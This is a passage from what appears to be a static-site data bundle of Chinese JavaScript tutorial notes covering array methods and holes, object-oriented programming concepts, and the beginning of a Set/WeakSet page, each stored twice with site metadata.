7]\n\n\nfill方法还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置。\n\n['a', 'b', 'c'].fill(7, 1, 2)\n// ['a', 7, 'c']\n\n\n\n# 22. arr.entries(),keys() 和 values()\n\n> ES6 提供三个新的方法——entries()，keys()和values()——用于遍历数组。它们都返回一个遍历器对象，可以用for...of循环进行遍历，唯一的区别是keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。\n\nfor (let index of ['a', 'b'].keys()) {\n  console.log(index);\n}\n// 0\n// 1\n\nfor (let elem of ['a', 'b'].values()) {\n  console.log(elem);\n}\n// 'a'\n// 'b'\n\nfor (let [index, elem] of ['a', 'b'].entries()) {\n  console.log(index, elem);\n}\n// 0 \"a\"\n// 1 \"b\"\n\n\n如果不使用for...of循环，可以手动调用遍历器对象的next方法，进行遍历。\n\nlet letter = ['a', 'b', 'c'];\nlet entries = letter.entries();\nconsole.log(entries.next().value); // [0, 'a']\nconsole.log(entries.next().value); // [1, 'b']\nconsole.log(entries.next().value); // [2, 'c']\n\n\n\n# 23. arr.flat(),flatMap()\n\n * 返回修改的数组\n * 不修改原数组\n\n> Array.prototype.flat()用于将嵌套的数组“拉平”，变成一维的数组。该方法返回一个新数组，对原数据没有影响。\n\n[1, 2, [3, 4]].flat()\n// [1, 2, 3, 4]\n\n\nflat()默认只会“拉平”一层，如果想要“拉平”多层的嵌套数组，可以将flat()方法的参数写成一个整数，表示想要拉平的层数，默认为1。\n\n[1, 2, [3, [4, 5]]].flat()\n// [1, 2, 3, [4, 5]]\n\n[1, 2, [3, [4, 5]]].flat(2)\n// [1, 2, 3, 4, 5]\n\n\nflatMap()方法对原数组的每个成员执行一个函数（相当于执行Array.prototype.map()），然后对返回值组成的数组执行flat()方法。该方法返回一个新数组，不改变原数组。\n\n// 相当于 [[2, 4], [3, 6], [4, 8]].flat()\n[2, 3, 4].flatMap((x) => [x, x * 2])\n// [2, 4, 3, 6, 4, 8]\n\n\nflatMap()只能展开一层数组。\n\nflatMap()方法的参数是一个遍历函数，该函数可以接受三个参数，分别是当前数组成员、当前数组成员的位置（从零开始）、原数组。\n\narr.flatMap(function callback(currentValue[, index[, array]]) {\n  // ...\n}[, thisArg])\n\n\nflatMap()方法还可以有第二个参数，用来绑定遍历函数里面的this。\n\nArray.from\n\n * Array.from 方法用于将两类对象转为真正的数组：类似数组的对象和可遍历的对象（包括 ES6 新增的数据结构 Set 和 Map）\n\n    var a = {\n        length: 2,\n        0: 'aaa',\n        1: 'bbb'\n    };\n    Array.from(a); //['aaa','bbb']\n    // 原理：Array.prototype.slice.call(a);\n    var b = {\n        length: 2\n    };\n    Array.from(b); //[undefined.undefined]\n\n\nArray.of\n\n * Array.of 方法用于将一组值，转换为数组。\n * Array.of 总是返回参数值组成的数组。如果没有参数，就返回一个空数组。\n\n    Array.of() // []\n    Array.of(undefined) // [undefined]\n    Array.of(1) // [1]\n    Array.of(1, 2) // [1, 2]\n\n\n\n# 数组的空位\n\n> 数组的空位指，数组的某一个位置没有任何值。比如，Array构造函数返回的数组都是空位\n\nArray(3) // [, , ,]\n\n\n上面代码中，Array(3)返回一个具有 3 个空位的数组。\n\nWARNING\n\n注意，空位不是undefined，一个位置的值等于undefined，依然是有值的。空位是没有任何值，in运算符可以说明这一点。\n\n0 in [undefined, undefined, undefined] // true\n0 in [, , ,] // false\n\n\n\n# 空位处理\n\nES5 对空位的处理，已经很不一致了，大多数情况下会忽略空位。\n\n * forEach(), filter(), reduce(), every() 和some()都会跳过空位。\n * map()会跳过空位，但会保留这个值\n * join()和toString()会将空位视为undefined，而undefined和null会被处理成空字符串\n\n// forEach方法\n[,'a'].forEach((x,i) => console.log(i)); // 1\n\n// filter方法\n['a',,'b'].filter(x => true) // ['a','b']\n\n// every方法\n[,'a'].every(x => x==='a') // true\n\n// reduce方法\n[1,,2].reduce((x,y) => x+y) // 3\n\n// some方法\n[,'a'].some(x => x !== 'a') // false\n\n// map方法\n[,'a'].map(x => 1) // [,1]\n\n// join方法\n[,'a',undefined,null].join('#') // \"#a#\"\n\n// toString方法\n[,'a',undefined,null].toString() // \",a,,\"\n\n\nES6 则是明确将空位转为undefined。\n\n// Array.from方法会将数组的空位，转为undefined，也就是说，这个方法不会忽略空位。\n\nArray.from(['a',,'b'])\n// [ \"a\", undefined, \"b\" ]\n// 扩展运算符（...）也会将空位转为undefined。\n\n[...['a',,'b']]\n// [ \"a\", undefined, \"b\" ]\n// copyWithin()会连空位一起拷贝。\n\n[,'a','b',,].copyWithin(2,0) // [,\"a\",,\"a\"]\n// fill()会将空位视为正常的数组位置。\n\nnew Array(3).fill('a') // [\"a\",\"a\",\"a\"]\n// for...of循环也会遍历空位。\n\nlet arr = [, ,];\nfor (let i of arr) {\n  console.log(1);\n}\n// 1\n// 1\n// 上面代码中，数组arr有两个空位，for...of并没有忽略它们。如果改成map方法遍历，空位是会跳过的。\n\n// entries()、keys()、values()、find()和findIndex()会将空位处理成undefined。\n\n// entries()\n[...[,'a'].entries()] // [[0,undefined], [1,\"a\"]]\n\n// keys()\n[...[,'a'].keys()] // [0,1]\n\n// values()\n[...[,'a'].values()] // [undefined,\"a\"]\n\n// find()\n[,'a'].find(x => true) // undefined\n\n// findIndex()\n[,'a'].findIndex(x => true) // 0\n// 由于空位的处理规则非常不统一，所以建议避免出现空位\n\n\n\n# 数组乱序\n\n> 将数组顺序打乱：例如不重复随机选取数组内容，可将数组打乱后按顺序取出\n\narr.sort(()=>Math.random()-0.5) 数组乱序排列\n\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.sort(() => Math.random() - 0.5)\nconsole.log(arr);\n\n\n * 案例： 抽奖，有1等奖一名，2等奖1名，3等奖2名，未中奖5名，要求每次点击抽取一个奖项",normalizedContent:"# 数组方法和属性\n\n\n# 属性\n\n 1. length: 数组中元素的个数\n 2. constructor: 返回对创建此对象的数组函数的引用（可以用来判断变量是否为数组）\n\n\n# 方法\n\n\n# 1. arr.push(); 向数组的末尾追加元素\n\n- 会修改原数组\n- 返回值：修改后的length值\n- 可以追加多个\n\n\n    arr[1, 2, 3];\n    arr1[4, 5, 6];\n    arr2[...arr, ...arr1]; //  ...扩展运算符，将数组展开\n\n\n\n# 2. arr.unshift(); 向数组的开头添加函数\n\n- 会修改原数组\n- 返回值：修改后的length值\n- 可以追加多个\n\n\n\n# 3. arr.pop(); 删除末尾的元素\n\n- 会修改原数组\n- 返回值：被删除的数据\n- 只能删除一个\n\n\n\n# 4. arr.shift(); 开头删除一个元素\n\n- 会修改原数组\n- 返回值：被删除的数据\n- 只能删除一个\n\n\n\n# 5. arr.splice(位置，删除元素的个数，要追加的元素); 任意位置添加删除\n\n- 添加或者删除包含对应下标\n- 添加数据时：删除元素的个数写0；\n- 可以同时删除和添加（先删除，后添加）\n- 修改原数组\n\n\n\n# 6. arr.join(\"分隔符\") 使用分隔符将数组数据隔开变为字符串\n\n- 不修改原数组\n- 返回值是分隔好的字符串\n\n\n\n# 7. arr.slice(截取的起始下标,结束下标) 数组的截取\n\n- 截取时，包含起始下标，不包含结束下标\n- 不修改原数组\n- 返回值是截取到的数组\n- 参数可以是负数，负数表示倒数，只传一个参数表示从起始下标截取到最后\n\n\n\n# 8. arr.concat 多个数组的连接\n\n- 不修改原数组\n- 返回值是连接之后的新数组       \n\n\n    var arr1 = [1, 2, 3];\n    var arr2 = [4, 5, 6];\n    console.log(arr1.concat(arr2, [7, 8, 9]));\n\n    // 控制台输出\n    // (9) [1, 2, 3, 4, 5, 6, 7, 8, 9]\n\n\n\n# 9. arr.indexof(值); 查找某个值在数组中第一次出现的下标\n\n- 返回值是数据的下标，没有找到则返回-1\n\n\n    var arr = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    console.log(arr.indexof(22)); //查找22在arr数组中的位置\n\n    // 控制台输出\n    // 6\n\n\n\n# 10. arr.lastindexof(值); 倒叙查找某个值在数组中第一次出现的位置\n\n\n# 11. arr.sort() 数组的排序\n\n- 如果没有参数，则从字符的编码开始按顺序排\n- 如果有参数，这个参数必须是一个函数（回调函数）这个回调函数有两个参数，分别是a，b\n- 修改原数组\n- 返回值是排序之后的数组                \n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 6, 622];\n    arr3.sort(function(a, b) {\n        //a-b 正序，\n        //b-a 倒序，  \n        return a - b;\n    })\n    console.log(arr3);\n    // 控制台输出\n    // (11) [1, 5, 6, 6, 22, 52, 66, 99, 552, 622, 663]\n    //箭头函数\n    arr.sort((a, b) => a - b) //正序，\n    arr.sort((a, b) => b - a) //倒序，\n\n\n\n# 12. arr.foreach() 遍历数组\n\n- 接收一个回调函数，回调函数第一个参数是 数组值\n- 第二个参数是 下标\n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 6, 622];\n    arr3.foreach(function(value, index) {\n        console.log(index, value)\n    })\n    // 箭头函数\n    arr3.foreach((value, index) => {\n        console.log(index, value)\n    })\n\n\n\n# 13. arr.filter() 过滤（根据条件筛选数组元素）\n\n- 根据回调函数的返回值进行元素筛选\n    * 返回值是true，该元素会保留\n    * 返回值是false，该元素跳过\n- 不修改原数组\n- 返回值是筛选之后的数组\n\n\n    var arr = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    var newarr = arr.filter(function(value, index) {\n        return value > 100; //筛选arr数组中值大于100的元素；\n    })\n    console.log(newarr);\n    // 控制台输出\n    // (4) [663, 552, 123, 622]\n\n\n    var person = [{\n            name: \"张三\",\n            age: 20,\n            sex: \"男\"\n        },\n        {\n            name: \"李四\",\n            age: 19,\n            sex: \"女\"\n        },\n        {\n            name: \"王五\",\n            age: 22,\n            sex: \"男\"\n        },\n        {\n            name: \"赵六\",\n            age: 21,\n            sex: \"女\"\n        }\n    ];\n    var x = person.filter(function(value, index) {\n        return value.age > 20; // 筛选出年龄大于20岁的学生\n        // return value.sex==\"男\";     //筛选出男同学\n    })\n    console.log(x);\n    // 箭头函数\n    arr.filter((value, index) => {\n        return 判断条件\n    })\n\n\n\n# 14. arr.map() 映射 将数组中的所有数据按照条件改变，形成新数组\n\n- 将回调函数每次的返回值，组成一个新的数组\n- 返回值是映射改变之后的数组\n- 不修改原数组\n\n\n    var arr = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    // var end=arr3.map(function(value,index){\n    // \treturn value*2;        //将数组中的所有元素都乘以2返回\n    // });\n    // 箭头函数\n    var end = arr.map((value, index) => value * 2);\n    console.log(end);\n\n\n\n# 15. arr.some() 判断 根据回调函数的判断条件来选择真假\n\n- 只要有一个回调函数返回值是true，最终some结果是true；\n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    var end = arr3.some(function(value, index) {\n        return value < 500;\n    });\n    console.log(end); //true\n\n\n\n# 16. arr.every() 判断 根据回调函数的判断条件来选择真假(与some比较记忆)\n\n- 只要有一个回调函数返回值是false，最终every结果是false；\n\n\n    var arr3 = [1, 5, 6, 99, 52, 663, 22, 66, 552, 123, 6, 622];\n    var end = arr3.every(function(value, index) {\n        return value < 500;\n    });\n    console.log(end); //false\n\n\n\n# 17. arr.reverse() 数组倒序\n\n- 返回修改后的数组\n- 改变原数组\n\n\n    var arr = [1, 5, 8, 6, 9, 4, 2, 3];\n    console.log(arr.reverse()); // (8) [3, 2, 4, 9, 6, 8, 5, 1]\n    console.log(arr); // (8) [3, 2, 4, 9, 6, 8, 5, 1]\n\n\n\n# 18. arr.includes()\n\n- 用于检查数组是否包含某元素，包含返回true，否则返回false\n- 无法检测对象是否存在\n- 假如只想知道某个值是否在数组中而并不关心它的索引位置，建议使用 `includes()` 。如果想获取一个值在数组中的位置，那么你只能使用 `indexof` 方法。并且 `includes()` 可以识别nan\n\n\n    var arr = [1, 2, {\n        name: \"张三\"\n    }]\n    arr.includes(2) // true\n    arr.includes(4) // false\n    arr.includes({\n        name: \"张三\"\n    }) // false\n\n\n- 可接收俩个参数：**要搜索的值, 搜索的开始索引**\n\n\n    ['a', 'b', 'c', 'd'].includes('b') // true\n    ['a', 'b', 'c', 'd'].includes('b', 1) // true\n    ['a', 'b', 'c', 'd'].includes('b', 2) // false\n\n\n- 此方法为 es7新增，兼容性\n\n\n\n\n\n# 19. arr.copywithin() 将指定位置的成员复制到其他位置\n\narray.prototype.copywithin(target, start = 0, end = this.length)\n\n * target（必需）：从该位置开始替换数据。如果为负值，表示倒数。\n * start（可选）：从该位置开始读取数据，默认为 0。如果为负值，表示从末尾开始计算。\n * end（可选）：到该位置前停止读取数据，默认等于数组长度。如果为负值，表示从末尾开始计算\n\n这三个参数都应该是数值，如果不是，会自动转为数值。\n\n// 将3号位复制到0号位\n[1, 2, 3, 4, 5].copywithin(0, 3, 4)\n\n\n * 改变原数组\n\n\n# 20. arr.find() 和 findindex()\n\n> 数组实例的find方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员。如果没有符合条件的成员，则返回undefined。\n\n[1, 4, -5, 10].find((n) => n < 0)\n// -5\n\n[1, 5, 10, 15].find(function(value, index, arr) {\n  return value > 9;\n}) // 10\n\n\n> 数组实例的findindex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1。\n\n[1, 5, 10, 15].findindex(function(value, index, arr) {\n  return value > 9;\n}) // 2\n\n\n\n# 21. arr.fill() 方法使用给定值，填充一个数组。\n\n * 原数组填充指定值\n * 改变原数组\n\n['a', 'b', 'c'].fill(7)\n// [7, 7, 7]\n\nnew array(3).fill(7)\n// [7, 7, 7]\n\n\nfill方法还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置。\n\n['a', 'b', 'c'].fill(7, 1, 2)\n// ['a', 7, 'c']\n\n\n\n# 22. arr.entries(),keys() 和 values()\n\n> es6 提供三个新的方法——entries()，keys()和values()——用于遍历数组。它们都返回一个遍历器对象，可以用for...of循环进行遍历，唯一的区别是keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历。\n\nfor (let index of ['a', 'b'].keys()) {\n  console.log(index);\n}\n// 0\n// 1\n\nfor (let elem of ['a', 'b'].values()) {\n  console.log(elem);\n}\n// 'a'\n// 'b'\n\nfor (let [index, elem] of ['a', 'b'].entries()) {\n  console.log(index, elem);\n}\n// 0 \"a\"\n// 1 \"b\"\n\n\n如果不使用for...of循环，可以手动调用遍历器对象的next方法，进行遍历。\n\nlet letter = ['a', 'b', 'c'];\nlet entries = letter.entries();\nconsole.log(entries.next().value); // [0, 'a']\nconsole.log(entries.next().value); // [1, 'b']\nconsole.log(entries.next().value); // [2, 'c']\n\n\n\n# 23. arr.flat(),flatmap()\n\n * 返回修改的数组\n * 不修改原数组\n\n> array.prototype.flat()用于将嵌套的数组“拉平”，变成一维的数组。该方法返回一个新数组，对原数据没有影响。\n\n[1, 2, [3, 4]].flat()\n// [1, 2, 3, 4]\n\n\nflat()默认只会“拉平”一层，如果想要“拉平”多层的嵌套数组，可以将flat()方法的参数写成一个整数，表示想要拉平的层数，默认为1。\n\n[1, 2, [3, [4, 5]]].flat()\n// [1, 2, 3, [4, 5]]\n\n[1, 2, [3, [4, 5]]].flat(2)\n// [1, 2, 3, 4, 5]\n\n\nflatmap()方法对原数组的每个成员执行一个函数（相当于执行array.prototype.map()），然后对返回值组成的数组执行flat()方法。该方法返回一个新数组，不改变原数组。\n\n// 相当于 [[2, 4], [3, 6], [4, 8]].flat()\n[2, 3, 4].flatmap((x) => [x, x * 2])\n// [2, 4, 3, 6, 4, 8]\n\n\nflatmap()只能展开一层数组。\n\nflatmap()方法的参数是一个遍历函数，该函数可以接受三个参数，分别是当前数组成员、当前数组成员的位置（从零开始）、原数组。\n\narr.flatmap(function callback(currentvalue[, index[, array]]) {\n  // ...\n}[, thisarg])\n\n\nflatmap()方法还可以有第二个参数，用来绑定遍历函数里面的this。\n\narray.from\n\n * array.from 方法用于将两类对象转为真正的数组：类似数组的对象和可遍历的对象（包括 es6 新增的数据结构 set 和 map）\n\n    var a = {\n        length: 2,\n        0: 'aaa',\n        1: 'bbb'\n    };\n    array.from(a); //['aaa','bbb']\n    // 原理：array.prototype.slice.call(a);\n    var b = {\n        length: 2\n    };\n    array.from(b); //[undefined.undefined]\n\n\narray.of\n\n * array.of 方法用于将一组值，转换为数组。\n * array.of 总是返回参数值组成的数组。如果没有参数，就返回一个空数组。\n\n    array.of() // []\n    array.of(undefined) // [undefined]\n    array.of(1) // [1]\n    array.of(1, 2) // [1, 2]\n\n\n\n# 数组的空位\n\n> 数组的空位指，数组的某一个位置没有任何值。比如，array构造函数返回的数组都是空位\n\narray(3) // [, , ,]\n\n\n上面代码中，array(3)返回一个具有 3 个空位的数组。\n\nwarning\n\n注意，空位不是undefined，一个位置的值等于undefined，依然是有值的。空位是没有任何值，in运算符可以说明这一点。\n\n0 in [undefined, undefined, undefined] // true\n0 in [, , ,] // false\n\n\n\n# 空位处理\n\nes5 对空位的处理，已经很不一致了，大多数情况下会忽略空位。\n\n * foreach(), filter(), reduce(), every() 和some()都会跳过空位。\n * map()会跳过空位，但会保留这个值\n * join()和tostring()会将空位视为undefined，而undefined和null会被处理成空字符串\n\n// foreach方法\n[,'a'].foreach((x,i) => console.log(i)); // 1\n\n// filter方法\n['a',,'b'].filter(x => true) // ['a','b']\n\n// every方法\n[,'a'].every(x => x==='a') // true\n\n// reduce方法\n[1,,2].reduce((x,y) => x+y) // 3\n\n// some方法\n[,'a'].some(x => x !== 'a') // false\n\n// map方法\n[,'a'].map(x => 1) // [,1]\n\n// join方法\n[,'a',undefined,null].join('#') // \"#a#\"\n\n// tostring方法\n[,'a',undefined,null].tostring() // \",a,,\"\n\n\nes6 则是明确将空位转为undefined。\n\n// array.from方法会将数组的空位，转为undefined，也就是说，这个方法不会忽略空位。\n\narray.from(['a',,'b'])\n// [ \"a\", undefined, \"b\" ]\n// 扩展运算符（...）也会将空位转为undefined。\n\n[...['a',,'b']]\n// [ \"a\", undefined, \"b\" ]\n// copywithin()会连空位一起拷贝。\n\n[,'a','b',,].copywithin(2,0) // [,\"a\",,\"a\"]\n// fill()会将空位视为正常的数组位置。\n\nnew array(3).fill('a') // [\"a\",\"a\",\"a\"]\n// for...of循环也会遍历空位。\n\nlet arr = [, ,];\nfor (let i of arr) {\n  console.log(1);\n}\n// 1\n// 1\n// 上面代码中，数组arr有两个空位，for...of并没有忽略它们。如果改成map方法遍历，空位是会跳过的。\n\n// entries()、keys()、values()、find()和findindex()会将空位处理成undefined。\n\n// entries()\n[...[,'a'].entries()] // [[0,undefined], [1,\"a\"]]\n\n// keys()\n[...[,'a'].keys()] // [0,1]\n\n// values()\n[...[,'a'].values()] // [undefined,\"a\"]\n\n// find()\n[,'a'].find(x => true) // undefined\n\n// findindex()\n[,'a'].findindex(x => true) // 0\n// 由于空位的处理规则非常不统一，所以建议避免出现空位\n\n\n\n# 数组乱序\n\n> 将数组顺序打乱：例如不重复随机选取数组内容，可将数组打乱后按顺序取出\n\narr.sort(()=>math.random()-0.5) 数组乱序排列\n\nvar arr = [1, 2, 3, 4, 5, 6, 7, 8, 9];\narr.sort(() => math.random() - 0.5)\nconsole.log(arr);\n\n\n * 案例： 抽奖，有1等奖一名，2等奖1名，3等奖2名，未中奖5名，要求每次点击抽取一个奖项",charsets:{cjk:!0}},{title:"面向对象编程",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/04-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B.html",relativePath:"Javascript/Javascript基础语法/07-对象/04-面向对象编程.md",key:"v-71010e0c",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/04-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B.html",headers:[{level:2,title:"特性",slug:"特性",normalizedTitle:"特性",charIndex:233},{level:2,title:"面向对象",slug:"面向对象",normalizedTitle:"面向对象",charIndex:2},{level:2,title:"面向过程与面向对象",slug:"面向过程与面向对象",normalizedTitle:"面向过程与面向对象",charIndex:641},{level:3,title:"面向过程",slug:"面向过程",normalizedTitle:"面向过程",charIndex:641},{level:3,title:"面向对象",slug:"面向对象-2",normalizedTitle:"面向对象",charIndex:2},{level:3,title:"二者的比较",slug:"二者的比较",normalizedTitle:"二者的比较",charIndex:894},{level:2,title:"面向对象编程的思想",slug:"面向对象编程的思想",normalizedTitle:"面向对象编程的思想",charIndex:1061},{level:2,title:"面向对象分析实现过程",slug:"面向对象分析实现过程",normalizedTitle:"面向对象分析实现过程",charIndex:1338}],headersStr:"特性 面向对象 面向过程与面向对象 面向过程 面向对象 二者的比较 面向对象编程的思想 面向对象分析实现过程",content:"# 面向对象编程\n\n> 面向对象即OOP(Object Oriented Programming)，是计算机的一种编程思想，OOP的基本原则是计算机是由子程序作用的单个或者多个对象组合而成，包含属性和方法的对象是类的实例.\n\nJavaScript也支持面向对象编程，它通过原型继承和属性和方法的方式实现面向对象编程，同样可以写出可复用，可封装的代码。\n\n对象就是人对各种具体物体抽象之后的概念，人们每天都在跟各种各样的对象打交道，比如说一本书就是一个对象。\n\n\n# 特性\n\n 1. 封装：能够将一个实体的信息、功能、响应都封装到一个单独对象中的特性。\n 2. 继承：在不改变源程序的基础上进行扩充，原功能得以保存，并且对子程序进行扩展，避免重复代码编写\n 3. 抽象：提取现实世界中某事物的关键特性，为该事物构建模型的过程。对同一事物在不同的需求下，需要提取的特性可能不一样。得到的抽象模型中一般包含：属性（数据）和操作（行为）。这个抽象模型我们称之为类。对类进行实例化得到对象。\n 4. 多态：多态是在继承的基础上实现的。多态的三个要素：继承、重写和父类引用指向子类对象。父类引用指向不同的子类对象时，调用相同的方法，呈现出不同的行为；就是类多态特性。多态可以分成编译时多态和运行时多态。\n\n\n# 面向对象\n\n 1. 对象：对象是一个整体，对外提供一些操作。\n 2. 面向对象：使用对象时，只关注对象提供的功能，不关注其内部细节。\n 3. JS的对象组成：方法 和 属性\n\n\n# 面向过程与面向对象\n\n> 面向对象并不是一种技术，而是一种思想，是一种解决问题的最基本的思维方式。\n\n\n# 面向过程\n\n面向过程专注于如何去解决一个问题的过程步骤。编程特点是由一个个函数去实现每一步的过程步骤，没有类和对象的概念。\n\n\n# 面向对象\n\n专注于由哪一个对象来解决这个问题，编程特点是出现了一个类，从类中拿到对象，由这个对象去解决具体问题。\n对于调用者来说，面向过程需要调用者自己去实现各种函数。而面向对象，只需要告诉调用者，对象中具体方法的功能，而不需要调用者了解方法中的实现细节。\n\n\n# 二者的比较\n\n * 都可以实现代码重用和模块化编程，面向对象的模块化更深，数据也更封闭和安全\n * 面向对象的思维方式更加贴近现实生活，更容易解决大型的复杂的业务逻辑\n * 从前期开发的角度来看，面向对象比面向过程要更复杂，但是从维护和扩展的角度来看，面向对象要远比面向过程简单！\n * 面向过程的代码执行效率比面向对象高。\n\n\n# 面向对象编程的思想\n\nTIP\n\n就是将一切的东西看作对象，将其中的行为封装为方法，特征封装为属性。\njavascript以前使用构造函数来进行封装，我们使用它来模拟其他言语中的类(如果你了解过其他语言的话)，ES6之后有了类，我们可以使用class关键字来创建类，然后将某种事物的特征和行为抽象出来，我们可以在需要使用的时候，通过实例化类来创建我们的对象。\n面向对象的核心思想是：不仅仅是简单的将功能进行封装（封装成函数），更是对调用该功能的主体进行封装，实现某个主体拥有多个功能，在使用的过程中，先得到对应的主体，再使用主体去实现相关的功能。\n\n\n# 面向对象分析实现过程\n\n 1. 分析哪些动作是由哪些实体发出的\n 2. 定义这些实体，为其增加相应的属性和功能\n 3. 让实体去执行相应的功能|动作\n\n * https://www.cnblogs.com/DcentMan/p/11247336.html\n * https://www.runoob.com/java/java-object-classes.html\n * https://www.cnblogs.com/jiejiejy/p/7666091.html\n * https://www.cnblogs.com/libin-1/p/5911190.html",normalizedContent:"# 面向对象编程\n\n> 面向对象即oop(object oriented programming)，是计算机的一种编程思想，oop的基本原则是计算机是由子程序作用的单个或者多个对象组合而成，包含属性和方法的对象是类的实例.\n\njavascript也支持面向对象编程，它通过原型继承和属性和方法的方式实现面向对象编程，同样可以写出可复用，可封装的代码。\n\n对象就是人对各种具体物体抽象之后的概念，人们每天都在跟各种各样的对象打交道，比如说一本书就是一个对象。\n\n\n# 特性\n\n 1. 封装：能够将一个实体的信息、功能、响应都封装到一个单独对象中的特性。\n 2. 继承：在不改变源程序的基础上进行扩充，原功能得以保存，并且对子程序进行扩展，避免重复代码编写\n 3. 抽象：提取现实世界中某事物的关键特性，为该事物构建模型的过程。对同一事物在不同的需求下，需要提取的特性可能不一样。得到的抽象模型中一般包含：属性（数据）和操作（行为）。这个抽象模型我们称之为类。对类进行实例化得到对象。\n 4. 多态：多态是在继承的基础上实现的。多态的三个要素：继承、重写和父类引用指向子类对象。父类引用指向不同的子类对象时，调用相同的方法，呈现出不同的行为；就是类多态特性。多态可以分成编译时多态和运行时多态。\n\n\n# 面向对象\n\n 1. 对象：对象是一个整体，对外提供一些操作。\n 2. 面向对象：使用对象时，只关注对象提供的功能，不关注其内部细节。\n 3. js的对象组成：方法 和 属性\n\n\n# 面向过程与面向对象\n\n> 面向对象并不是一种技术，而是一种思想，是一种解决问题的最基本的思维方式。\n\n\n# 面向过程\n\n面向过程专注于如何去解决一个问题的过程步骤。编程特点是由一个个函数去实现每一步的过程步骤，没有类和对象的概念。\n\n\n# 面向对象\n\n专注于由哪一个对象来解决这个问题，编程特点是出现了一个类，从类中拿到对象，由这个对象去解决具体问题。\n对于调用者来说，面向过程需要调用者自己去实现各种函数。而面向对象，只需要告诉调用者，对象中具体方法的功能，而不需要调用者了解方法中的实现细节。\n\n\n# 二者的比较\n\n * 都可以实现代码重用和模块化编程，面向对象的模块化更深，数据也更封闭和安全\n * 面向对象的思维方式更加贴近现实生活，更容易解决大型的复杂的业务逻辑\n * 从前期开发的角度来看，面向对象比面向过程要更复杂，但是从维护和扩展的角度来看，面向对象要远比面向过程简单！\n * 面向过程的代码执行效率比面向对象高。\n\n\n# 面向对象编程的思想\n\ntip\n\n就是将一切的东西看作对象，将其中的行为封装为方法，特征封装为属性。\njavascript以前使用构造函数来进行封装，我们使用它来模拟其他言语中的类(如果你了解过其他语言的话)，es6之后有了类，我们可以使用class关键字来创建类，然后将某种事物的特征和行为抽象出来，我们可以在需要使用的时候，通过实例化类来创建我们的对象。\n面向对象的核心思想是：不仅仅是简单的将功能进行封装（封装成函数），更是对调用该功能的主体进行封装，实现某个主体拥有多个功能，在使用的过程中，先得到对应的主体，再使用主体去实现相关的功能。\n\n\n# 面向对象分析实现过程\n\n 1. 分析哪些动作是由哪些实体发出的\n 2. 定义这些实体，为其增加相应的属性和功能\n 3. 让实体去执行相应的功能|动作\n\n * https://www.cnblogs.com/dcentman/p/11247336.html\n * https://www.runoob.com/java/java-object-classes.html\n * https://www.cnblogs.com/jiejiejy/p/7666091.html\n * https://www.cnblogs.com/libin-1/p/5911190.html",charsets:{cjk:!0}},{title:"Set && WeakSet",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/09-Set%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html",relativePath:"Javascript/Javascript基础语法/09-Set数据结构.md",key:"v-309f3f3a",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/09-Set%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html",headers:[{level:2,title:"set 基本用法",slug:"set-基本用法",normalizedTitle:"set 基本用法",charIndex:21},{level:2,title:"Set 实例的属性和方法",slug:"set-实例的属性和方法",normalizedTitle:"set 实例的属性和方法",charIndex:958},{level:3,title:"属性",slug:"属性",normalizedTitle:"属性",charIndex:965},{level:3,title:"方法",slug:"方法",normalizedTitle:"方法",charIndex:108},{level:2,title:"WeakSet",slug:"weakset",normalizedTitle:"weakset",charIndex:9},{level:3,title:"语法",slug:"语法",normalizedTitle:"语法",charIndex:2679},{level:3,title:"操作方法",slug:"操作方法-2",normalizedTitle:"操作方法",charIndex:1073}],headersStr:"set 基本用法 Set 实例的属性和方法 属性 方法 WeakSet 语法 操作方法",content:"# Set && WeakSet\n\n\n# set 基本用法\n\n该数据结构，类似于数组，但是，它的成员都是唯一的，没有重复的值。\n\nSet本身是一个构造函数，用来生成 Set 数据结构。\n\n// 上面代码通过add()方法向 Set 结构加入成员，结果表明 Set 结构不会添加重复的值。\nvar s = new Set();\n[2, 3, 3, 5, 4, 5].map(x => {\ns.add(x);\nconsole.log(s);\n});\n// Set {2}\n// Set {2, 3}\n// Set {2, 3}\n// Set {2, 3, 5}\n// Set {2, 3, 5, 4}\n// Set {2, 3, 5, 4}\n\n\n在Set()函数中可以传入一个数组（或者具有 iterable 接口的其他数据结构）类型的参数。\n\nvar set = new Set([3,5,1,1,4]);\nconsole.log([...set]);    // [3,5,1,4]\nconsole.log(set.size);    // 4\n\n\n在set中，判断是否重复，使用的是\"Same-value equality\",类似于\"===\",但是有例外，其中NaN不等于NaN。\n\nvar set = new Set();\nset.add(NaN);\nset.add(NaN);\nset.add(\"1\");\nset.add(1);\nconsole.log(set) // Set {NaN, \"1\", 1}\n\n\n// 去除数组的重复成员\n[...new Set(array)]\n// 去除字符串里面的重复字符\n[...new Set('ababbc')].join('')\n// \"abc\"\n\n\nArray.from方法可以将 Set 结构转为数组。\n\nconst items = new Set([1, 2, 3, 4, 5]);\nconst array = Array.from(items);\n\n\nfunction 